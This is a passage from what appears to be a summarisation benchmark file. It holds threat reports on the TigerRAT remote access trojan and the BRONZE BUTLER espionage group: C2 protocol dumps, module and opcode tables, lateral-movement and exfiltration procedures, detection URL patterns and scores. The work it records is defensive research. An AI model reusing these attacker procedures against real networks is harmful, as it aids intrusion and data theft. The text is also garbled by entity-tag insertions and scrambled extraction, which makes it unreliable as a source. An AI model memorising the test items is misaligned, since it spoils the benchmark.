32 30 |php?member = sbi20| 00000020 30 39 20 53 53 4c 33 [CARDINAL] 2e [CARDINAL] 33 [CARDINAL] 2e 37 00 |09 SSL3.3.7.| [ DEBUG ] sent 00000000 [QUANTITY] 48 [QUANTITY] 54 [QUANTITY] 54 [QUANTITY] 50 20 31 2e 31 20 32 30 30 20 [CARDINAL] 4f 4b [CARDINAL] 20 |HTTP [CARDINAL] 1.1 [CARDINAL] 200 OK | 00000010 53 53 4c 32 2e 31 00 |SSL2.1.| [ DEBUG ] received [CARDINAL] 00000000 f2 [CARDINAL] 7c 29 [CARDINAL] 1f a5 [CARDINAL] 75 fa [CARDINAL] 20 [CARDINAL] 23 f7 [CARDINAL] 7b [CARDINAL] 5b fa [CARDINAL] 5b e1 [CARDINAL] 4a |.| ) u. [CARDINAL] # .{[.[.J| 00000000 [CARDINAL] 78 [CARDINAL] 50 [CARDINAL] 50 79 67 [CARDINAL] 4f 6e 00 |xPPygOn.|Figure [CARDINAL] 2 : TigerRAT handshakeAfter the handshake process has been completed successfully , the malware will proceed to send all further data in a standard command format and encrypted using the CryptorRC4 class . A single [QUANTITY] 32 - byte RC4 key is used to initialize [CARDINAL] two separate running RC4 ciphers . [CARDINAL] One is used to decrypt incoming traffic and the other is used to encrypt outgoing traffic . The encrypted traffic has the following format ( Figure [CARDINAL] 3):struct packet { } ; Figure [CARDINAL] 3 : Encrypted traffic structureOnce decrypted the command format is as follows ( Figure [CARDINAL] 4):struct command { uint32 module ; uint32 opcode;4/12uint32 size ; uint8 * data ; } ; Figure [CARDINAL] 4 : Command structureAfter the handshake , the malware sends to the [CARDINAL] C2 server a unique victim machine identifier previously generated by the IDGeneratorAdapter class . The unique ID is generated by calling the GetAdaptersInfo API and getting the hardware address for [CARDINAL] one of the network devices on the victim machine ( Figure [CARDINAL] 5).[DEBUG ] received 00000000 [CARDINAL] 18 00 00 00 [CARDINAL] 9d c6 [CARDINAL] 28 3a a8 [CARDINAL] 14 [CARDINAL] 21 6c [CARDINAL] 4f 27 81 [CARDINAL] 0a | [ORG] \u2026\u2026 (: ! [ORG] lO \u2019 | 00000010 5c 4d 4d [CARDINAL] 42 cd 2e 65 fa fd [CARDINAL] 50 b0 [QUANTITY] 29 [QUANTITY] |\\MMB e P.)| [ DEBUG ] TigerRAT Command [ DEBUG ] Module : 0x0 [ DEBUG ] Opcode : 0x1 [ DEBUG ] Size : 0xc [ DEBUG ] Data : 00000000 f0 18 98 80 95 32 00 00 00 00 00 00 | \u2026 [CARDINAL] 2 \u2026 \u2026 |Figure [CARDINAL] 5 : TigerRAT victim IDAfter the handshake process and upload of the victim ID , the malware initiates a heartbeat thread to send periodic packets to the C2 server , as well as a receive thread to read and process commands sent back from the C2 server . The subsequent actions of the malware will depend on the commands received from the [CARDINAL] C2 server ; refer \u201c [ORG] Commands \u201d . An example of a heartbeat command can be seen below ( Figure [CARDINAL] 6):[DEBUG ] received 00000000 0c 00 00 00 a5 [CARDINAL] 31 [CARDINAL] 6d a7 8f cd d4 [CARDINAL] 70 aa e1 d4 56 | \u2026 [CARDINAL] 1m \u2026 .p \u2026 V| [ DEBUG ] TigerRAT Command [ DEBUG ] Module : 0x0 [ DEBUG ] Opcode : 0x10 DEBUG ] Size : 0x0Figure [CARDINAL] 6 : TigerRAT heartbeatCommands Each Module class has a unique ID associated with it . This ID is set in the command structure sent from the [CARDINAL] C2 server down to the malware . The complete list of Module IDs can be seen below : Module ID Module Name0x10x20x30x40x5ModuleUpdateModuleInformationModuleShellModuleFileManagerModuleKeyLogger5/120x60x70xaModuleSocksTunnelModuleScreenCaptureModulePortForwarderTable [CARDINAL] 2 : Module IDsThe following tables list the various opcodes used by the different [PERSON] Module classes and their function . [PERSON] ModuleUpdateOpcode [PERSON] Description0x200x30Calls ExitProcessDelete itself and exitTable [CARDINAL] 3 : ModuleUpdate opcodesModuleInformationOpcode Description0x100x200x300x40Retrieve victim \u2019s computer name using GetComputerNameWRetrieve victim \u2019s Windows version using RtlGetVersionRetrieve victiom \u2019s adapter info using GetAdaptersInfoRetrieve victim \u2019s username using [PRODUCT] GetUserNameWTable [PRODUCT] 4 : [ORG] ModuleInformation opcodesModuleShellOpcode [ORG] Description0x100x200x300x40Execute a commandSet current directoryGet current directoryTest TCP connectionTable [CARDINAL] 5 : [ORG] ModuleShell opcodesModuleFileManagerOpcode Description0x10Retrieve drive info6/120x200x300x400x420x430x500x570x5f0x600x630x700x800x90List filesDelete fileStart file upload to victim machineWrite data to uploaded fileFinish file upload to victim machineDownload file from victim machineSet offset in file to downloadWait for file transfers to finishCall CreateProcessWCall CreateProcessAsUserWDownload a directory from victim machineFind filesFind filesTable [CARDINAL] 6 : ModuleFileManager opcodesModuleKeyLoggerOpcode Description0x100x110x200x210x250x32Initialize keyloggerSet keylogger flagStop keyloggerSet keylogger flagRetrieve keylogger outputRetrieve keylogger fileTable [CARDINAL] 7 : ModuleKeyLogger opcodesModuleSocksTunnelOpcode Description0x100x200x30Start socks tunnelForward dataStop socks tunnel7/12Table [CARDINAL] 8 : [ORG] ModuleSocksTunnel [ORG] opcodesModuleScreenCaptureOpcode [ORG] Description0x100x200x500x520x530x600x610x620x630x640x650x660x67Start screen captureStop screen captureModify mouseModify mouseModify mouseSend [PERSON] VK_ESCAPE using keybd_eventSend VK_MENU + VK_TAB using keybd_eventSend VK_CONTROL + A using keybd_eventSend VK_RSHIFT + VK_DELETE using keybd_eventSend VK_MENU + VK_F4 using keybd_eventSend [PERSON] VK_RETURN using keybd_eventSend [ORG] VK_SPACE using keybd_eventSend VK_TAB using keybd_eventTable [CARDINAL] 9 : ModuleScreenCapture opcodesModulePortForwarderOpcode Description0x110x200x30Retrieve port forwarding statusStart port forwardingStop port forwardingTable [CARDINAL] 10 : ModulePortForwarder opcodesDetection and [ORG] BlockingThe TigerRAT malware may be detected . Figure [CARDINAL] 7 below shows TigerRAT launching multiple command interpreters in response to simulated commands sent from the mock C2 server . [ORG] VMware [ORG] Carbon [ORG] Black [ORG] Cloud can be configured to block unknown software attempting to run command interpreters as seen in Figure [CARDINAL] 8 below.8/12Figure [CARDINAL] 7 : Process tree of TigerRAT executing remote commands9/12Figure [CARDINAL] 8 : [ORG] VMware [ORG] Carbon [ORG] Black [ORG] Cloud blocking execution on unknown application attempting to run a command interpreterMITRE ATT&CK TIDsTIDTacticT1059.003 [PERSON] ExecutionDescriptionCommand and Scripting Interpreter : Windows Command", "generated_text": "the report; a new threat; TigerRAT; late 2020; VMware Carbon Black; similarities; Kaspersky; Malwarebytes; Lazarus; the malware; commands; log; keystrokes; monitor; data; communication; the C2 server; HTTP web traffic; the initial payload; a PE file; the loader; a PE; memory; encryption; commands; a PE file; a PE file; the initial payload; commands; summary; the Middle East; Asia; an advanced adversary; the wild.", "ref_text": "<START-1>The document analyzes a new remote access Trojan called TigerRAT that has been used in attacks since late 2020. TigerRAT is delivered via a custom loader that decrypts the payload stored inside the binary. The payload uses RC4 and DES encryption and custom protocols to communicate with command and control servers. TigerRAT has capabilities to manipulate files, capture screens, log keystrokes, and tunnel traffic. It runs commands sent from the C2 server via modules that handle specific functions. Analysis identifies similarities to malware attributed to Lazarus group subgroups. TigerRAT exhibits tactics like credential access, collection, exfiltration, and encrypted C2 channels. Detection methods include monitoring for suspicious process behavior like launching shells, blocking unknown software that spawns shells, and network signatures. IOCs are provided for the malware samples and C2 servers. In summary, the report provides an in-depth analysis of the new TigerRAT malware family, its delivery technique, C2 protocol, capabilities, attacker ties, detection methods, and IOCs for defenders. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.47184986595174266, "gpt3/lexical/rouge_rouge2": 0.10242587601078167, "gpt3/lexical/rouge_rougeL": 0.20911528150134048, "gpt3/lexical/rouge_rougeLsum": 0.20911528150134048, "gpt3_generated_text": ["The article discusses the newly discovered malware called TigerRAT, which was reported by the Korea Internet & Security Agency (KISA) in September 2021. The malware shares similarities with previously reported malware by Kaspersky and Malwarebytes and is believed to be associated with the Lazarus threat actor group. TigerRAT has been used in attacks since late 2020 and is identified by VMware's Threat Analysis Unit as a payload used in broader campaigns against target enterprises. The malware has various capabilities, including file manipulation, remote command execution, keystroke logging, and remote viewing and control of the screen. TigerRAT utilizes a unique approach to storing its payload, with encrypted configuration data for Command and Control (C2) communications embedded within the malware. The malware disguises its communication with the C2 server to appear like HTTP web traffic. The article provides a detailed analysis of the loader structure and function of TigerRAT, as well as the different modules and classes used by the malware. It emphasizes that TigerRAT is likely to be used as part of a larger campaign involving other malware types and attack techniques. The article concludes by highlighting the importance of detecting and disrupting such campaigns. Overall, TigerRAT is an advanced adversary that poses a significant threat to target enterprises in the Middle East and Asia."]}, {"split_name": "test", "sample_id": "test_69", "prompt_text": "Extract the keywords: SolutionsServicesCapabilitiesInsightsAboutContactResearch \ue902 BRONZE BUTLER Targets Japanese Enterprises Login\ue906THREAT ANALYSISBRONZE BUTLER Targets [NORP] Japanese Enterprises Secureworks \u00ae [ORG] Counter [ORG] Threat [ORG] Unit \u2122 Threat IntelligenceTHURSDAY , [DATE] OCTOBER [DATE] 12 , [DATE] 2017 BY : [ORG] COUNTER [ORG] THREAT [ORG] UNIT [ORG] RESEARCH TEAM\ue90a \ue906 \ue904 [CARDINAL] \ue908Summary Secureworks \u00ae incident responders and [ORG] Counter [ORG] Threat [ORG] Unit \u2122 ( CTU ) researchers [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIRead the [CARDINAL] CapabilitiesLEARN MOREinvestigated activities associated with [ORG] the [ORG] BRONZE [ORG] BUTLER ( also known as threat group , which likely originates in [GPE] the People 's [GPE] Republic [GPE] of [GPE] China ( [GPE] PRC ) . BRONZE BUTLER 's operations suggest a long - standing intent to ex\ufb01ltrate intellectual property and other con\ufb01dential data from [NORP] Japanese organizations . Intrusions observed by CTU \u2122 researchers indicate a focus on networks involved in critical infrastructure , heavy industry , manufacturing , and international relations . Tick ) andtactical . Executives can use the strategic assessmentstrategicthreat intelligenceabout this threat group intoCTU researchers divided the [CARDINAL] two sections : of the ongoing threat to determine how to reduce risk to their organization 's mission and critical assets . Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group 's activities . Key pointsAnalysis of BRONZE BUTLER 's operations , targeting , and capability led CTU researchers to assess that it is likely that the group is located in the [GPE] PRC . The group has used spearphishing , strategic web compromises ( SWCs ) , and an exploit of a zero - day vulnerability to compromise targeted systems . After ex\ufb01ltrating targeted data from a network , BRONZE BUTLER typically deletes evidence of its activities . However , it maintains access to compromised environments when possible , periodically revisiting compromised sites to identify new opportunities for data ex\ufb01ltration . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF APIThe threat actors seemingly have the capability to develop and deploy their own proprietary malware tools . The group 's command and control ( C2 ) protocols are encrypted , presenting challenges for network defenders and incident responders . Strategic threat intelligence Analysis of a threat group 's targeting , origin , and competencies can determine which organizations could be at risk . This information can help organizations make strategic defensive decisions regarding this threat . Intent CTU analysis indicates that BRONZE BUTLER primarily targets organizations located in [GPE] Japan . The threat group has sought unauthorized access to networks of organizations associated with critical infrastructure , heavy industry , manufacturing , and international relations . Secureworks analysts have observed BRONZE BUTLER ex\ufb01ltrating the following categories of data : Intellectual property related to technology and development Product speci\ufb01cation Sensitive business and sales - related information [ORG] Network and system con\ufb01guration \ufb01les Email messages and meeting minutesThe focus on intellectual property , product details , and corporate information suggests that the group seeks information that they believe might be of value [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIto competing organizations . The diverse targeting suggests that BRONZE BUTLER may be tasked by multiple teams or organizations with varying priorities . Attribution The following characteristics led CTU researchers to assess that it is likely that BRONZE BUTLER originates in the [GPE] PRC : Use of T - SMB [NORP] Scan tools published on a [NORP] Chinese developer 's website [NORP] Chinese characters in the installation service name of an early version of the xxmm backdoor [ORG] NCPH hacking group during [GPE] PRC national holidayslinks between BRONZE BUTLER 's [ORG] Daserf tool and the [ORG] PRC- , and a decrease in BRONZE BUTLER activityPRC - based cyberespionage groups have historically sought intellectual property and economic intelligence from competing economies to deliver information which can provide a competitive advantage domestically . The demand for this type of intelligence gathering could be in\ufb02uenced by [GPE] China \u2019s ambitious economic growth goals .Capability BRONZE BUTLER has used a broad range of publicly available ( [PERSON] Mimikatz and gsecdump ) and proprietary ( [PERSON] Daserf and [PERSON] Datper ) tools . It appears to have beenPDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIsuf\ufb01ciently resourced to continuously develop and replace its proprietary tools over a long period of time . The threat actors developed remote access tools and malware that generate and use encrypted C2 communication , presumably to complicate detection and mitigation . The threat actors are also \ufb02uent in [NORP] Japanese , crafting phishing emails in native [NORP] Japanese and operating successfully within a [LANGUAGE] Japanese - language environment . CTU analysis indicates that BRONZE BUTLER purchases a subset of its C2 infrastructure . A large percentage of this infrastructure is hosted in [GPE] Japan , possibly to avoid scrutiny from security agencies that monitor international communications . The group periodically changes the C2 IP addresses and domains for each compromised network , which can limit the effectiveness of blacklisting the group 's infrastructure . The group also supplements its operational infrastructure with access to compromised websites . The breadth and complexity of BRONZE BUTLER 's operational infrastructure suggests that the group may have access to a dedicated infrastructure acquisition function . The group has demonstrated the ability to identify a signi\ufb01cant zero - day vulnerability within a popular [NORP] Japanese corporate tool and then use scan - and- exploit techniques to indiscriminately compromise [NORP] Japanese Internet - facing enterprise systems . The threat actors appear to use these initial footholds to select organizations of interest for further compromise . The group is attentive to changes in compromised networks and proactively attempts to avoid scrutiny from network defenders by modifying tools and methods . It has remained undetected in several compromised networks for [DATE] up [DATE] to [DATE] \ufb01ve [DATE] years . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APITactical threat intelligence Incident response engagements have given CTU researchers insight into the tools and tactics that BRONZE BUTLER employs during intrusions . Tools CTU researchers have observed BRONZE BUTLER leveraging the following tools that appear to be exclusive to the group . Figure [CARDINAL] 1 shows the threat group 's use of some proprietary tools between 2012 and 2017.Figure 1 . Timeline of malware used by BRONZE BUTLER . ( Source : Secureworks)Daserf \u2014 This backdoor has the functionality of a remote shell and can be used to execute commands , upload and download data , capture screenshots , and log keystrokes . It uses RC4 encryption and customPDF generated automatically by the PDFmyURL HTML to [ORG] PDF APIBase64 encoding to obfuscate HTTP traf\ufb01c . CTU researchers identi\ufb01ed [CARDINAL] two versions of [ORG] Daserf written in [GPE] Visual C and [ORG] Delphi . Analysis of the compile timestamps suggest that [ORG] Delphi version is the successor to the Visual C version . CTU analysis suggests that the following registry entry is an indication of a [ORG] Delphi - based [ORG] Daserf infection : Key : [PERSON] HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer [PERSON] Value : MMID = < random hex string > Datper \u2014 BRONZE BUTLER likely created this [ORG] Delphi - coded [ORG] RAT to replace [PERSON] Daserf . [PERSON] Datper uses an RC4 - encrypted con\ufb01guration to obfuscate HTTP traf\ufb01c . xxmm ( also known as [PERSON] Minzen ) \u2014 This [ORG] RAT and likely successor to [ORG] Daserf [ORG] AES - encrypts HTTP communications using a [CARDINAL] one - time encryption key . As of this publication , BRONZE BUTLER demonstrates a preference for concurrently using [PERSON] Datper and xxmm in its operations . CTU researchers identi\ufb01ed an xxmm builder for xxmm ( see Figure [CARDINAL] 2 ) , which suggests that the threat actors customize the xxmm malware settings based on the target . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIFigure [ORG] 2 . Customizable settings in an xxmm builder . ( Source : Secureworks)xxmm downloader ( also known as [ORG] KVNDM ) \u2014 This simple downloader 's code is similar to the main xxmm payload . Gofarer \u2014 This downloader uses the \u201c Mozilla/4.0 + ( compatible;+MSIE+8.0;+Windows+NT+6.1;+Trident/4.0 ; \u201d User - Agent in its HTTP communication ( see Figure [CARDINAL] 3).PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIFigure [ORG] 3 . Gofarer HTTP GET request . ( Source : Secureworks)MSGet \u2014 This persistent downloader uses a dead - drop resolver ( [ORG] DDR ) to download and execute another malicious payload . MSGet typically downloads encoded binaries from hard - coded URLs . After decoding , [ORG] MSGet saves the binary as % TEMP%\\ms DGet \u2014 This simple downloader ( see Figure [CARDINAL] 4 ) is similar to the server retrieval tool.exe and executes it.<hex string>.wgetwebFigure [CARDINAL] 4 . DGet usage . ( Source : Secureworks)Screen Capture Tool \u2014 This tool can capture the desktop of a victim 's system ( see Figure [CARDINAL] 5).PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIFigure 5 . Screen Capture Tool usage . ( Source : Secureworks)RarStar \u2014 This custom tool uploads [ORG] RAR archives to a speci\ufb01ed URL as [ORG] POST data ( see Figure [CARDINAL] 6 ) . [ORG] RarStar encodes the [ORG] POST data using [PERSON] Base64 and a custom XOR algorithm . Figure [CARDINAL] 6 . [ORG] RarStar [ORG] HTTP [ORG] POST request . ( Source : Secureworks)BRONZE [ORG] BUTLER has also used the following publicly available tools , but CTU researchers determined that the group modi\ufb01ed most of them . Analysis of the \ufb01les identi\ufb01ed the use of multiple packers , adjusted functionality in the source code , and recompilation . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIMimikatz \u2014 This tool retrieves passwords from memory . [ORG] Windows [ORG] Credential Editor ( WCE ) \u2014 This tool obtains passwords from memory . gsecdump \u2014 This tool obtains passwords from memory . T - SMB [NORP] Scan \u2014 This SMB scanning tool was originally published on a [NORP] Chinese program - sharing website ( pudn.com ) . BRONZE BUTLER removed its help message functionality . WinRAR \u2014 This tool extracts tools for lateral movement and compresses data for ex\ufb01ltration . Tactics , techniques , and procedures Incident response engagements have given CTU researchers insight into the tactics that BRONZE BUTLER employs during intrusions . Delivery BRONZE BUTLER uses spearphishing emails and SWCs to compromise target networks , often leveraging Flash . The group has used phishing emails with Flash animation attachments to download and execute [ORG] Daserf malware , and has alsoFlash exploits for [ORG] SWC attacks.leveragedCTU researchers observed BRONZE BUTLER using compromised websites , typically located in [GPE] Japan and [GPE] South [GPE] Korea , as part of its attack infrastructure . The group has demonstrated a capability to compromise and leverage a large number of websites in its campaigns . Based on the large quantity of [PRODUCT] C2PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIservers and varying [ORG] IP addresses used during the same operation , the group also appears to purchase attack infrastructure . BRONZE BUTLER has leveraged a distinct attack infrastructure for different targets , suggesting that the group proactively segments operational infrastructure to minimize the risk of attribution by security researchers . Exploitation While investigating a [DATE] 2016 intrusion , Secureworks incident responders identi\ufb01ed BRONZE BUTLER exploiting a then - unpatched remote code execution vulnerability ( CVE-2016 - 7836 ) in product used to manage an organization 's IT assets . [ORG] SKY [ORG] Corporation the vulnerability on [DATE] December 21 , [DATE] 2016 , but entries in the victim 's announced [ORG] SKYSEA [ORG] Client [ORG] View default log ( CtlCli.log ) show that the group had exploited the issue since [DATE] at [DATE] least [DATE] June [DATE] 2016 ( see Figure [CARDINAL] 7 ) . , a popular JapaneseSKYSEA Client ViewFigure [CARDINAL] 7 . [ORG] SKYSEA [ORG] Client [ORG] View log entries resulting from CVE-2016 - 7836 exploitation . ( Source : Secureworks)This vulnerability can be exposed when a portable connection device , such as an [ORG] LTE USB modem , is connected to corporate devices . It is common for remote [NORP] Japanese workers to use portable connection devices to connect toPDF generated automatically by the PDFmyURL HTML to [ORG] PDF APIthe Internet and corporate VPNs . However , some of these devices assign the [ORG] ISP 's global [ORG] IP address to the connected laptop . Threat actors could exploit the vulnerability to impersonate the management console , and compromise the laptop 's [ORG] SKYSEA agent that is exposed on the Internet . BRONZE BUTLER conducted periodic Internet scans to \ufb01nd vulnerable hosts . CTU researchers veri\ufb01ed that some exploited systems were not subject to further compromise or lateral movement . This outcome suggests that the group may deploy malware to all identi\ufb01ed vulnerable systems , but then pursues speci\ufb01c targets after validating the system 's association with organizations of interest . Installation The threat actors use multiple custom downloaders that rely on executable \ufb01les ( [LOC] Gofarer , MSGet , and xxmm downloader ) , [ORG] PowerShell scripts , or VBS / VBE scripts . These downloaders use HTTP traf\ufb01c , download an additional payload such as [ORG] Daserf , [PERSON] Datper , or xxmm in a compressed and encoded format , and typically execute the downloaded malware after decoding the \ufb01le . CTU researchers identi\ufb01ed the code in Figure [CARDINAL] 8 within a downloader program . This code inserts \u2018 0 ' characters at the end of the executable \ufb01le to in\ufb02ate the \ufb01le size to 50 - 100 MB , likely to evade antivirus software detection . When analyzing BRONZE BUTLER incidents , CTU researchers observed several antivirus tools skip scanning of in\ufb02ated \ufb01les . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIFigure 8 . Downloader malware code used to in\ufb02ate payload \ufb01le size . ( Source : Secureworks)CTU researchers also observed BRONZE BUTLER copying downloader source code to a \ufb01le ( do.cs ) on a compromised system and then compiling it into an executable \ufb01le ( [PERSON] do.exe ) . The decrypted proxy log shows the threat actors compiling custom code on the compromised system ( see Figure [CARDINAL] 9).Figure [CARDINAL] 9 . Decrypted proxy log showing compilation of custom code onPDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIcompromised endpoint . ( Source : Secureworks)Command and control ( C2 ) communication [PERSON] Daserf , [PERSON] Datper , and xxmm communicate with [CARDINAL] C2 servers via HTTP , encrypting commands and data using the algorithms in [LAW] Table [LAW] 1 . The tools use an Internet Explorer component to bypass proxy authentication as long as the compromised system communicates during the authorized times de\ufb01ned by the proxy server . HTTP methodsEncryption algorithm [PERSON] Malware [PERSON] Daserf ( Visual C ) POST RC4 Daserf ( [ORG] Delphi ) GET ( POST for large data ) RC4 GET ( POST for large data ) RC4 GET ( POST for large data ) RC4Table [CARDINAL] 1 . [ORG] Daserf , [PERSON] Datper , and xxmm encryption algorithms . AES with [CARDINAL] one - time encryption keyBRONZE [ORG] BUTLER uses unique [CARDINAL] C2 servers for each tool and changes [CARDINAL] C2 servers periodically . A large proportion of the group 's [CARDINAL] C2 servers are hosted in [GPE] Japan . The presence of certain URL patterns in proxy logs ( see [LAW] Table [LAW] 2 ) can reveal BRONZE BUTLER activity . Malware URL patternUser - AgentPDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIDaserf < domain / path > string > < [CARDINAL] 4 lowercase characters><string similar to Base64 - encoded string>.gif .asp .php?id=<8 - digit hex = [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.0 ; SV1 ) Internet [ORG] Explorer version number may varyDatper url hex string><random string > http:// characters><16 - digit hex string > < string similar to Base64 - encoded string><lowercase.php?21 = [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF APIMozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.0 ; SV1)<8 - digit hex < number > < [CARDINAL] 8 - digit hex < number>&idcard6=.php?t0= string > < number > < number > idcard1=<number>&idcard2 string > < number > < [CARDINAL] 8 - digit hex string > < number > < number > \ufb01lename>.php?item0= < number><8 - digit hex < [CARDINAL] 8 - digit hex < number><random /<8 - digit hex<8 - digit hex < number>=<8 - digit hex = < [CARDINAL] 8 - digit hex < number > < [CARDINAL] 8 - digit hex < [CARDINAL] 8 - digit hex < number > < [CARDINAL] 8 - digit hex<8 - digit hex < number > < [CARDINAL] 8 - digit hexTable [CARDINAL] 2 . URL patterns related to BRONZE BUTLER activity . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIBRONZE [ORG] BUTLER leverages the remote access capabilities in these tools , often using existing PC vendors ' directories such as C:\\DELL and C:\\HP as working directories in compromised environments . CTU researchers have also observed threat actors using the following working directories : C:\\Intel\\ [DATE] C:\\Intel\\Logs\\ [DATE] C:\\Intel\\ExtremeGraphics\\CUI\\ C:\\PerfLogs\\Admin\\Credential access BRONZE BUTLER uses credential theft tools such as Mimikatz and WCE to steal authentication information from the memory of compromised hosts . Several xxmm samples analyzed by CTU researchers incorporate [PERSON] Mimikatz , allowing the threat actors to issue [PERSON] Mimikatz commands directly from xxmm ( see Figure [CARDINAL] 10 ) . In addition , xxmm incorporates a [ORG] UAC bypass tool for privilege escalation prior to stealing passwords . Figure [CARDINAL] 10 . Mimikatz command in xxmm . ( Source : Secureworks)CTU analysis revealed BRONZE BUTLER creating forged Kerberos Ticket Granting Ticket ( [ORG] TGT ) and [ORG] Ticket [ORG] Granting [ORG] Service ( [ORG] TGS ) tickets ( also calledPDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIgolden and silver tickets , respectively ) to maintain administrative access . Figure [CARDINAL] 11 shows an example of the threat actors creating a golden ticket . Figure [CARDINAL] 11 . [ORG] Kerberos golden ticket created by BRONZE BUTLER . ( Source : Secureworks)Golden tickets require a username , but the domain controller does not validate that it is legitimate . CTU researchers detected BRONZE BUTLER using the following usernames for golden tickets : bgtras The threat actors typically use built - in Windows ping and net commands for network and host enumeration activity to eventually contact the \ufb01le - share server ( see Figure [CARDINAL] 12 ) . BRONZE BUTLER also uses the T - SMB [NORP] Scan tool to list available [ORG] SMB hosts , and screen - capture tools to obtain additional information . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIFigure 12 . Host enumeration by BRONZE BUTLER . ( Source : Secureworks)Lateral movement After compromising a host , the threat actors attempt to compromise other connected systems to move within the network . BRONZE BUTLER typically uses the following procedure for lateral [GPE] movement:1 . Use \u2018 net use ' and \u2018 copy ' commands to transfer a malicious \ufb01le ( such as malware ) from the compromised host to a target system on the same network.2 . Use the \u2018 net time ' command to check the local time on the targetsystem.3 . Use the \u2018 at ' or \u2018 schtask ' commands to register a scheduled task tobe executed in a few minutes.4 . After [TIME] a [TIME] few [TIME] minutes , execute the malicious \ufb01le on the system . The malicious \ufb01le is typically a batch \ufb01le that downloads malware and registers the malware 's automatic execution in the registry . Figure [CARDINAL] 13 shows the [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF APIscheduled task that executes [PERSON] zrun.bat ( a batch \ufb01le ) using the at command . Figure [CARDINAL] 13 . Scheduled task registration . ( Source : Secureworks)Figure [CARDINAL] 14 shows the batch \ufb01le ( zrun.bat ) executing , which adds a registry entry that auto - executes the malware . Figure [CARDINAL] 14 . Registry entry added to auto - execute malware . ( Source : Secureworks)CTU researchers have also observed BRONZE BUTLER giving malware the same name as an existing document \ufb01le on the \ufb01le share server to cause users to unwittingly launch and install the malware on additional systems ( see Figure [DATE] 15).Figure [DATE] 15 . [PERSON] Malware given the same name as an existing document \ufb01le . ( Source : [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APISecureworks)Ex\ufb01ltration BRONZE BUTLER typically creates a list of \ufb01les ( i.e. , a shopping list ) from compromised hosts and \ufb01le - share servers . If the list is short , the group ex\ufb01ltrates the \ufb01les directly . For large lists , the threat actors use the following procedure:1 . Use malware to upload the large list of enumerated \ufb01les to the C2server.2 . Select speci\ufb01c \ufb01les to steal , creating a new list . [CARDINAL] 3 . Use downloaders or other malware to send the new list to acompromised host.4 . Use archiving software to collect \ufb01les in a password - protectedarchive.5 . Use an uploader or other malware to send the archived \ufb01les to anattacker - controlled server . The uploader software is proprietary to this group , but [PERSON] Datper and xxmm also contain an uploading feature . When ex\ufb01ltration is complete , the uploader ( or [PERSON] Datper or xxmm ) immediately uses the del command to delete the [ORG] RAR archives . Figure [CARDINAL] 16 shows BRONZE BUTLER extracting a new list of \ufb01les and archiving a speci\ufb01c \ufb01le into [ORG] RAR format for ex\ufb01ltration . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF APIFigure 16 . Extracting a new \ufb01le list and archiving a targeted \ufb01le for ex\ufb01ltration . ( Source : Secureworks)The group uses a password to encrypt \ufb01les for [ORG] RAR archiving . CTU researchers have observed the following passwords used in [ORG] BRONZE [ORG] BUTLER network BRONZE BUTLER compromises organizations to conduct cyberespionage , [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIprimarily focusing on [NORP] Japanese enterprises . Initial attack vectors include spearphishing emails , SWCs , and exploiting vulnerability in software commonly used by [NORP] Japanese businesses . The group can override security controls to ex\ufb01ltrate intellectual property , and victims should formulate a solid eviction plan before engaging with the threat actors to prevent them from reentering the network . CTU researchers recommend that organizations , particularly those whose assets and intellectual property could be valuable to BRONZE BUTLER , implement the following security practices : [ORG] AETD ) to log detailed Windows event information to assist with incidentReview proxy log settings to ensure they capture information such as HTTP parameters and User - Agents for future analysis . Search proxy log \ufb01les for evidence of web server scanning using the URL patterns associated with BRONZE BUTLER activity . Use an advanced endpoint threat detection ( ) solution to monitor activity on network endpoints . Install a background monitor tool ( e.g. , Implement timely vulnerability patching and system updates . [ORG] Update [ORG] SKYSEA [ORG] Client [ORG] View implementations to the latest version as soon as possible . Review network access control . In particular , review network access for use of mobile [ORG] USB modems on corporate systems . Also implement strict security controls for privileged accounts such as [ORG] Active [ORG] Directory administrator to prevent access by an unauthorized user . [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] API\ue805\ue804Threat indicators The indicators in Table 3 are associated with BRONZE BUTLER activity . The URLs may contain malicious content , so consider the risks before opening them in a browser . Indicator ( Visual C)Daserf host toolsUsed by host toolsurl\ufb02ashinfo / ns12.jpgurl\ufb02ashinfo / pageicons/6.jpgurl generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIURLURLURLURLURLUsed by host toolsUsed by pointurl pointTable [CARDINAL] 3 . BRONZE BUTLER indicators.\ue90a \ue906 \ue904 \ue908Enjoyed what you read ? Share it!RELATED CONTENTPDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APIBLOGTHREAT [ORG] ANALYSISBLOGSecureworks at GISEC [DATE] 2018 \u2013 